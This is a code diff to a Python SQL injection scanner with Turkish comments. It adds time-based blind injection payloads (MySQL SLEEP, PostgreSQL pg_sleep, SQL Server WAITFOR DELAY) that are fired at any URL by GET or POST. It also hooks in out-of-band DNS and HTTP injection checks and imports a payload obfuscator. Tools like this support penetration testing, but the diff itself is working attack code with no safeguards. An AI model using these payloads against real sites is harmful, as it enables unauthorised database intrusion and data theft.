@@ -3,6 +3,7 @@ import logging
 import random
 from concurrent.futures import ThreadPoolExecutor
 from obfuscator import obfuscate_payloads
+from oob_tester import dns_oob_injection, http_oob_injection
 
 def get_response(url, headers, method='GET', data=None):
     """
@@ -46,6 +47,23 @@ def check_response(normal_response_content, response, payload, error_messages):
         return True
     return False
 
+def time_delay_injection(url, headers, is_post=False, data=None):
+    payloads = [
+        "1' AND SLEEP(5)-- ",
+        "1); SELECT pg_sleep(5)--",
+        "'; WAITFOR DELAY '00:00:05'--"
+    ]
+    for payload in payloads:
+        if is_post:
+            data['injection'] = payload
+            response = requests.post(url, headers=headers, data=data)
+        else:
+            response = requests.get(f"{url}{payload}", headers=headers)
+        if response.elapsed.total_seconds() > 5:
+            logging.warning(f"Zaman gecikmesi enjeksiyonu başarılı! Payload: {payload}")
+            return True
+    return False
+
 def test_sql_injection(url, payloads, error_messages, user_agents, is_post=False, data=None):
     """
     SQL enjeksiyon testini yürütür.
@@ -64,7 +82,22 @@ def test_sql_injection(url, payloads, error_messages, user_agents, is_post=False
     else:
         logging.error("Normal yanıt alınamadı, test gerçekleştirilemiyor.")
         return
-    
+
+    # Zaman gecikmesi enjeksiyonunu kontrol edin
+    if time_delay_injection(url, headers, is_post, data):
+        logging.info(f"Zaman gecikmesi ile SQL enjeksiyonu tespit edildi.")
+        return
+
+    # Out-of-band DNS enjeksiyonunu kontrol edin
+    if dns_oob_injection(url, headers, is_post, data):
+        logging.info(f"Out-of-band DNS enjeksiyonu tespit edildi.")
+        return
+
+    # Out-of-band HTTP enjeksiyonunu kontrol edin
+    if http_oob_injection(url, headers, is_post, data):
+        logging.info(f"Out-of-band HTTP enjeksiyonu tespit edildi.")
+        return
+
     # Çoklu iş parçacığı ile test işlemleri
     with ThreadPoolExecutor(max_workers=5) as executor:
         for payload in payloads:
